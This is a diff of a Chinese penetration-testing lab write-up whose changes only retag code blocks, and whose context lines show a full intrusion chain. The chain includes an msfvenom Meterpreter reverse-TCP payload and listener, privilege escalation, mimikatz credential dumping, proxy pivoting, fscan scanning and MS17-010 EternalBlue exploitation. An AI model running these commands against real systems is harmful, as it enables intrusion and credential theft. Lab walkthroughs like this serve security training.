@@ -177,7 +177,7 @@ None
 
 生成载荷
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.129 LPORT=9999 -f exe > aaa.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -189,7 +189,7 @@ Final size of exe file: 7168 bytes
 
 将载荷上传到靶机，并建立监听
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ msfconsole -q
 msf6 > use exploit/multi/handler
@@ -211,7 +211,7 @@ meterpreter >
 
 处理一下中文乱码
 
-```shell
+```bash
 C:\>chcp 65001
 chcp 65001
 Active code page: 65001
@@ -219,7 +219,7 @@ Active code page: 65001
 
 ## 网络信息搜集
 
-```shell
+```bash
 meterpreter > ipconfig
 
 Interface  1
@@ -351,7 +351,7 @@ IPv6 Netmask : ffff:ffff:ffff:ffff::
 
 尝试直接借助 Metasploit 直接提权
 
-```shell
+```bash
 meterpreter > getuid
 Server username: GOD\Administrator
 meterpreter > getsystem
@@ -364,7 +364,7 @@ Server username: NT AUTHORITY\SYSTEM
 
 既然已经得到了 `NT AUTHORITY\SYSTEM` 用户权限的话，那么就可以尝试获取域的信息
 
-```shell title="获取域的凭据信息"
+```bash title="获取域的凭据信息"
 meterpreter > load kiwi
 Loading extension kiwi...
   .#####.   mimikatz 2.2.0 20191125 (x64/windows)
@@ -421,7 +421,7 @@ stu1$          GOD.ORG  55 bb da 11 1c 19 32 70 d5 18 4c a2 19 e7 0d f4 01 b8 fe
 
 查看域控信息
 
-```shell
+```bash
 C:\Windows\system32>net user /domain
 net user /domain
 The request will be processed at a domain controller for domain god.org.
@@ -467,7 +467,7 @@ The command completed with one or more errors.
 
 直接使用 Metasploit 内建的转发模块
 
-```shell
+```bash
 meterpreter > run autoroute -s 192.168.52.0/24
 
 [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
@@ -490,14 +490,14 @@ Active Routing Table
 
 退出当前会话
 
-```shell
+```bash
 meterpreter > bg
 [*] Backgrounding session 1...
 ```
 
 然后执行 socks 代理模块
 
-```shell
+```bash
 msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
 msf6 auxiliary(server/socks_proxy) > exploit
 [*] Auxiliary module running as background job 0.
@@ -530,7 +530,7 @@ socks5 127.0.0.1 1080
 
 然后 proxychains 启动 fscan
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains ./tools/fscan-1.8.3/fscan -h 192.168.52.0/24
 [proxychains] config file found: /etc/proxychains4.conf
@@ -596,7 +596,7 @@ start vulscan
 
 直接定位到漏洞信息
 
-```shell
+```bash
 [+] MS17-010 192.168.52.141     (Windows Server 2003 3790)
 [+] MS17-010 192.168.52.138     (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)
 [+] ftp 192.168.52.141:21:anonymous
@@ -606,7 +606,7 @@ start vulscan
 
 直接开打
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains msfconsole -q
 msf6 > search ms17_010
@@ -642,7 +642,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
 发现 plantform 有点问题，目标机器是 x86 架构的，换一个 payload
 
-```shell
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > use auxiliary/admin/smb/ms17_010_command
 msf6 auxiliary(admin/smb/ms17_010_command) > set rhost 192.168.200.141
 rhost => 192.168.200.141
